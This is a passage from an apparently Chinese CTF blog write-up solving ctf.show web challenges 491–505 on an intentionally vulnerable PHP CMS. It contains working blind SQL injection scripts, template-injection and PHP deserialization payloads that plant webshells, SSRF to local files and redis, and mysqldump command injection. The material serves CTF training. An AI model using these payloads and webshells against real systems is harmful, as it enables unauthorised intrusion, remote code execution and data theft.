class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>username处可以注入</p>
<p>username处可以注入，没有md5包裹，变量覆盖到上面了，所以其实后面的我们都不可控。</p>
<p>盲注脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4b962d26-b183-471c-b6ca-7c0ca0bac069.challenge.ctf.show/index.php?action=check&amp;username=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#二分法</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = f<span class="string">&quot;admin&#x27; or if(ascii(substr((select load_file(&#x27;/flag&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0);--%20qwe&quot;</span></span><br><span class="line">        r = requests.<span class="title function_ invoke__">get</span>(url+payload)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;flag_here&quot;</span> in r.text):</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br></pre></td></tr></table></figure>

<h1 id="web492√"><a href="#web492√" class="headerlink" title="web492√"></a>web492√</h1><p>模板代码注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">		<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跳过第一个if判断，直接覆盖<code>$user</code>变量试试看。</p>
<p>看下<code>templateUtil::render</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&lt;！--&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;--&gt;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那就是回到了488，但是下面value被注释掉了，闭合一下写入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?action=check&amp;user[username]=--&gt;<span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /f*&#x27;</span>)<span class="meta">?&gt;</span>&lt;! --&amp;username=;<span class="string">&#x27;-=</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里小坑：</p>
<p>user[username]</p>
<p>而user[‘username’]不行</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220329001229-s6bcnqp.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220329001241-uhsu1lt.png" alt="image.png"></p>
<p>细心点比较好。</p>
</blockquote>
<h1 id="web493√"><a href="#web493√" class="headerlink" title="web493√"></a>web493√</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<p>反序列化入口，<code>$user</code>类我们可控。</p>
<p>可以利用的类在<code>/index.php?action=../render/db_class</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;log, <span class="variable">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接用<code>dbLog</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$content</span>, <span class="variable">$log</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql = <span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log = <span class="variable">$log</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;&lt;?=system(&#x27;cat /f*&#x27;);?&gt;&quot;</span>,<span class="string">&quot;/var/www/html/2.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h1 id="web494√-495√"><a href="#web494√-495√" class="headerlink" title="web494√,495√"></a>web494√,495√</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$content</span>, <span class="variable">$log</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql = <span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log = <span class="variable">$log</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;</span>,<span class="string">&quot;/var/www/html/5.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220329004556-rlwq3d2.png" alt="image.png"></p>
<h1 id="web496"><a href="#web496" class="headerlink" title="web496*"></a>web496*</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$user=unserialize($c);</span></span><br></pre></td></tr></table></figure>

<p>上面三题的反序列化入口被修复了。</p>
<blockquote>
<p>做着做着感觉，没有学到啥新东西。</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220329005715-eodp4yc.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27; union select &quot;username&quot;,&quot;test&quot;; -- qwe</span></span><br></pre></td></tr></table></figure>

<p> 这里的注入可以让我们进到后台，<code>$_SESSIO</code></p>
<p>后台可以发现<code>api/admin_edit.php</code>能够盲注</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以盲注，但是要先登陆后台。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://98d554ee-ac65-4f47-90a2-e812ac904ea0.challenge.ctf.show/index.php?action=check&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://98d554ee-ac65-4f47-90a2-e812ac904ea0.challenge.ctf.show/api/admin_edit.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27; || 1#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r1 = session.post(url=url1, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27; || 1#&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r1 = session.post(url=url1, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or if(ascii(substr((select/**/group_concat(flagisherebutyouneverknow118)from(flagyoudontknow76)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) -- qwe&quot;</span></span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">&#x27;nickname&#x27;</span>:random.randint(<span class="number">1</span>,<span class="number">100000000000</span>),</span><br><span class="line">            <span class="string">&#x27;user[username]&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        req = session.post(url2,data2)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;\\u529f&quot;</span> <span class="keyword">in</span> req.text):</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>第35行的反斜杠要转义（细节没注意到卡了一会儿）</p>
</blockquote>
<h1 id="web497"><a href="#web497" class="headerlink" title="web497"></a>web497</h1><p>SSRF</p>
<p>render&#x2F;render_class.php</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> function <span class="title function_">checkImage</span><span class="params">($templateContent,$arg=array()</span>)&#123;</span><br><span class="line">	foreach ($arg <span class="type">as</span> <span class="variable">$key</span> <span class="operator">=</span>&gt; $value) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(stripos($templateContent, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.$key.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">			$encode=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span>(file_exists(__DIR__.<span class="string">&#x27;/../cache/&#x27;</span>.md5($value)))&#123;</span><br><span class="line">				$encode=file_get_contents(__DIR__.<span class="string">&#x27;/../cache/&#x27;</span>.md5($value));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$ch=curl_init($value);</span><br><span class="line">				curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">				curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">				$result=curl_exec($ch);</span><br><span class="line">				curl_close($ch);</span><br><span class="line">				$ret=chunk_split(base64_encode($result));</span><br><span class="line">				$encode = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . $ret;</span><br><span class="line">				file_put_contents(__DIR__.<span class="string">&#x27;/../cache/&#x27;</span>.md5($value), $encode);</span><br><span class="line">			&#125;</span><br><span class="line">			$templateContent=str_replace(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.$key.<span class="string">&#x27;&#125;&#125;&#x27;</span>, $encode, $templateContent);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $templateContent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以触发SSRF，<code>$value</code>为传入的图片路径，也就是头像。</p>
<p>api&#x2F;admin_edit.php，这个登录后台就能看得到。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user)&#123;</span><br><span class="line">	extract($_POST);</span><br><span class="line">	$user= $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\\\/&#x27;</span>, $avatar))&#123;</span><br><span class="line">		$ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;存在无效字符&#x27;</span>;</span><br><span class="line">		die(json_encode($ret));</span><br><span class="line">	&#125;</span><br><span class="line">	$sql = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.substr($nickname, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;,avatar=&#x27;&quot;</span>.$avatar.<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.substr($user[<span class="string">&#x27;username&#x27;</span>],<span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	$db=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">	<span class="keyword">if</span>($db-&gt;update_one($sql))&#123;</span><br><span class="line">		$_SESSION[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=$nickname;</span><br><span class="line">		$_SESSION[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;avatar&#x27;</span>]=$avatar;</span><br><span class="line">		$ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	die(json_encode($ret));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后台可以控制<code>$_SESSION[&#39;user&#39;][&#39;avatar&#39;]</code>，直接打<code>file:///flag</code></p>
<h1 id="web498√"><a href="#web498√" class="headerlink" title="web498√"></a>web498√</h1><p>这道也是SSRF，触发点和上一题相同。</p>
<p>可以用gopherus直接打redis</p>
<h1 id="web499√"><a href="#web499√" class="headerlink" title="web499√"></a>web499√</h1><p>api&#x2F;admin_settings.php</p>
<p>用php文件保存序列化数据？？</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330001225-ddomu5t.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330001200-nnbu2qw.png" alt="image.png"></p>
<p>直接写入一句话</p>
<h1 id="web500√"><a href="#web500√" class="headerlink" title="web500√"></a>web500√</h1><p>新页面api&#x2F;admin_db_backup.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="variable">$db_path</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="variable">$db_path</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接拼接命令即可</p>
<h1 id="web501√"><a href="#web501√" class="headerlink" title="web501√"></a>web501√</h1><p>漏洞点还是上面的admin_db_backup.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^zip|tar|sql$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$db_format</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>开头为zip即可绕过，拼接命令</p>
<h1 id="web502√"><a href="#web502√" class="headerlink" title="web502√"></a>web502√</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(zip|tar|sql)$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="variable">$pre</span>.<span class="variable">$db_format</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>没对另一个变量过滤啊！</p>
<h1 id="web503√"><a href="#web503√" class="headerlink" title="web503√"></a>web503√</h1><p>刚刚的洞给修了，那就是到后台看看有没有新功能。。</p>
<p>这什么，没见过</p>
<p>api&#x2F;admin_upload.php</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330004555-7ikqjqb.png" alt="image.png"></p>
<p>再结合之前的数据库类写phar，备份那个地方存在触发点也可控</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330010701-xp8lm73.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pre=phar:<span class="comment">///var/www/html/img/628941e623f5a967093007bf39be805f.jp&amp;db_format=g</span></span><br></pre></td></tr></table></figure>

<h1 id="web504"><a href="#web504" class="headerlink" title="web504"></a>web504</h1><p>不能读源码</p>
<p>上传模板处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">name=../../../../../<span class="keyword">var</span>/www/html/config/settings&amp;content=O:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>:<span class="number">8</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;log&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;dbLog&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;N;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;log&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;log/1.php&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(<span class="subst">$_GET</span>[1]);?&gt;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;port&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;3306&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;addr&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;127.0.0.1&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;database&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web505√"><a href="#web505√" class="headerlink" title="web505√"></a>web505√</h1><p>api&#x2F;admin_file_view.php</p>
